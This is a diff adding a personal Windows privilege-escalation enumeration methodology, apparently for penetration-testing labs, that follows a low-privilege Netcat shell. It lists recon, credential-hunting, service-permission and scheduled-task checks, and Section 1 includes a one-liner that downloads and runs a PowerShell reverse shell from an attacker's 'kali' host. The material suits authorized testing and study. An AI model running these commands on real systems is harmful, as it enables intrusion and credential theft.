@@ -1,9 +1,129 @@
+### Windows Priv-Esc Enumeration Flow (Post-Low-Priv Shell)
 
+After getting a reverse shell via Netcat (e.g., exploited vuln to download nc.exe from Kali), stabilize it first, then enumerate methodically. Focus on broad system context before targeted vectors. Document everything in a txt file on my Kali for the report. Iterate based on findings—if something looks vulnerable, exploit it before full enum.
 
-start-process PowerShell -verb runas   #Upgrade powershell to admin powershell if you have permissions
-runas /user:backupadmin cmd    #Run a command as another user. Helpful if target user doesn’t have GUI access. **Runas can be used with local or domain accounts as long as the user has the ability to log on to the system.
+#### 1. Stabilize and Orient Shell
+First thing: Make the shell reliable and get quick bearings on who I am and the environment. Check for restrictions that might block uploads or commands (e.g., AppLocker, execution policies). This prevents losing access mid-enum.
 
-CrackMapExec
+What to look for/do: 
+- User context, groups, privileges (e.g., spot SeImpersonatePrivilege for Potato exploits or SeBackupPrivilege for file access).
+- Environment details like current dir, shell type (cmd or powershell), and if PowerShell is available/bypassed.
+- Stabilize if Netcat drops easily—spawn a better shell for interactivity.
 
-If the target user has the Log on as a batch job access right, we can schedule a task to execute a program of our choice as this user. 
-Additionally, if the target user has an active session, we can use PsExec from Sysinternals.
+Sample commands:
+- `whoami /all`: Shows current user, SIDs, groups, privileges, and integrity level. Use to identify enabled privs like SeDebugPrivilege (for process injection) or SeTakeOwnershipPrivilege (for file ownership changes). Pipe to file: `whoami /all > whoami.txt`.
+- `echo %username% && hostname && pwd`: Quick user, machine name, and current working dir. Helps orient if I'm in a user profile or system dir.
+- `systeminfo | findstr /C:"Domain"`: Checks if domain-joined (might hint at AD but skip deep dive).
+- `powershell -ep bypass`: Switches to PowerShell with execution policy bypassed for better scripting/interactivity. If fails, note policy: `Get-ExecutionPolicy`.
+- For better shell: If cmd is unstable, `powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://kali/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress kali_ip -Port 4444"`. (Upload script first if needed.)
+
+#### 2. System and Patch Level Enum
+Build a profile of the OS to spot kernel exploits or missing patches. Prioritize this as old/unpatched Windows (e.g., < Win10 1809) often have public exploits like EternalBlue variants or CVE-2020-0796.
+
+What to look for/do: 
+- OS name, version, build, arch (x86/x64), install date—cross-ref with exploit DB on my Kali.
+- Installed hotfixes and gaps (e.g., missing KB for known CVEs).
+- Antivirus/EDR presence (e.g., Windows Defender status) that might block exploits.
+- Save output to file for offline analysis with tools like windows-exploit-suggester.py on Kali.
+
+Sample commands:
+- `systeminfo > sysinfo.txt`: Dumps full system info (OS, hardware, hotfixes). Grep for vulns: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"OS Build" /C:"Hotfix(s)"`.
+- `wmic qfe get Caption,Description,HotFixID,InstalledOn /format:table`: Lists patches in table; sort by InstalledOn to see recent/missing ones. Export: `wmic qfe list full /format:list > patches.txt`.
+- `ver`: Quick version string (e.g., "Microsoft Windows [Version 10.0.19041.928]").
+- `wmic os get Caption, OSArchitecture, LastBootUpTime`: OS details and uptime (long uptime might mean unpatched).
+- For AV: `sc query windefend`: Checks if Defender is running. `Get-MpComputerStatus` (in PowerShell) for full Defender status.
+
+#### 3. User, Group, and Access Enum
+Map users, groups, and my access to spot escalation paths via group memberships or weak accounts.
+
+What to look for/do: 
+- Local/domain users, their details (e.g., last logon, password age—old passwords might be crackable).
+- Group memberships (e.g., if I'm in Backup Operators, can read sensitive files).
+- Privileges from earlier whoami—enable if needed (e.g., `whoami /priv` lists them).
+- Home dirs for personal files/creds.
+
+Sample commands:
+- `net users`: Lists all local users. Follow with `net user <username>` for details like full name, password reqs, last set.
+- `net localgroup`: Lists groups; `net localgroup administrators` shows admins. Check if I'm in any like "Remote Desktop Users".
+- `net accounts`: Domain/local policy (e.g., password length, lockout threshold—useful for brute-force ideas).
+- `lusrmgr.msc`: If GUI access, but usually CLI: `wmic useraccount get name,sid`.
+- For privileges: `whoami /groups` (shows group SIDs); look for high-priv groups like INTERACTIVE or SERVICE.
+
+#### 4. Network and Connectivity Enum
+Identify internal services, pivots, or exposed ports that might lead to priv-esc (e.g., binding to localhost service).
+
+What to look for/do: 
+- Interfaces, IPs, routes—spot dual-homed boxes for pivoting.
+- Listening ports/PIDs (focus on 0.0.0.0 vs 127.0.0.1—localhost might need port-forward).
+- Firewall rules blocking outbound (affects my shell) or inbound exploits.
+- Connected sessions or shares.
+
+Sample commands:
+- `ipconfig /all`: Full network config, including DNS servers (might resolve internal names).
+- `route print`: Routing table; look for other subnets.
+- `arp -a`: ARP cache for nearby hosts.
+- `netstat -ano > netstat.txt`: Ports, connections, PIDs. Grep: `netstat -ano | findstr LISTENING` for listeners; match PID to process with `tasklist /svc /fi "PID eq <pid>"`.
+- `netsh advfirewall show allprofiles`: Firewall state; `netsh advfirewall firewall show rule name=all` for rules.
+- `net view`: Visible shares; `net session` for sessions.
+
+#### 5. Credential and Password Hunting
+Hunt for stored creds—often the quickest win on misconfigured boxes.
+
+What to look for/do: 
+- Plaintext in files (configs, scripts, unattended installs), registry, or histories.
+- Cached creds (e.g., from RunAs or RDP).
+- Specific spots like web apps, VNC configs, or autologon keys.
+- Be thorough but quiet—search user dirs first.
+
+Sample commands:
+- `findstr /sim password *.txt *.ini *.config *.xml /C:"password"`: Recursive search for "password" in files; add dirs like `findstr /si password C:\Users\*`.
+- `dir /s /b *pass* == *cred* == *vnc* == *.config* == *unattend*`: Finds suspicious file names.
+- `type C:\Windows\Panther\Unattend.xml` or `type C:\sysprep.inf`: Unattended install files with encoded creds (base64 decode passwords).
+- `reg query HKLM /f password /t REG_SZ /s > regpass.txt`: Searches registry for password strings.
+- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`: Autologon creds.
+- `cmdkey /list`: Cached credentials; use `/add` and `runas` to exploit if found.
+- PowerShell history: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
+
+#### 6. Service and Permission Enum
+Core for priv-esc—check services running as SYSTEM with weak perms.
+
+What to look for/do: 
+- Service paths, start names, binaries—writable paths/exes allow replacement.
+- Unquoted paths (hijack by placing exe in dir).
+- ACLs on services/files (e.g., Users writable on service bin).
+- Running as high priv with modifiable configs.
+
+Sample commands:
+- `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`: Spots auto-start unquoted paths.
+- `sc query` or `Get-Service` (PS): List services; `sc qc <service>` for config (binpath, start type).
+- `icacls "C:\path\to\service.exe"`: Checks permissions (look for (M) or (F) for Users/Authenticated Users).
+- `accesschk.exe -wus "Everyone" *`: If uploaded Sysinternals, checks writable services. Or `-ucqv <service>` for specific.
+- For all: `for /f "tokens=2 delims= " %a in ('sc query ^| findstr SERVICE_NAME') do sc qc %a >> services.txt`.
+
+#### 7. Scheduled Tasks, Registry, and Misc Checks
+Cover tasks, autoruns, and other misconfigs.
+
+What to look for/do: 
+- Tasks running as SYSTEM with writable exes.
+- Registry flags for elevated installs or weak keys.
+- Autoruns/DLLs in writable dirs for hijacking.
+- Environment vars like PATH for prepend attacks.
+
+Sample commands:
+- `schtasks /query /fo LIST /v > tasks.txt`: Lists tasks; check Command/Run As User. Perms: `icacls "C:\path\to\task.exe"`.
+- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`: If 1, exploit with msiexec /quiet /i malicious.msi.
+- `wmic startup get caption,command`: Autoruns; check paths with icacls.
+- `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`: Run keys; look for modifiable values.
+- `set`: Environment vars; check PATH dirs for writability: `icacls <dir>`.
+- For DLLs: If app runs, use ProcMon (uploaded) with filters for CreateFile on DLL loads.
+
+#### 8. Automated Enum (If Stuck)
+Upload and run tools for comprehensive scans—use after manual to confirm.
+
+What to look for/do: 
+- Highlights missed vectors; quiet modes to avoid noise.
+
+Sample commands:
+- Upload winPEAS.exe: `.\winPEASany.exe quiet servicesinfo creds` (focus sections).
+- PowerUp.ps1: `Invoke-AllChecks` or `Invoke-ServiceAbuse` for specifics.
+- If PS blocked, use cmd versions or Sherlock.ps1 for quick vuln scans.
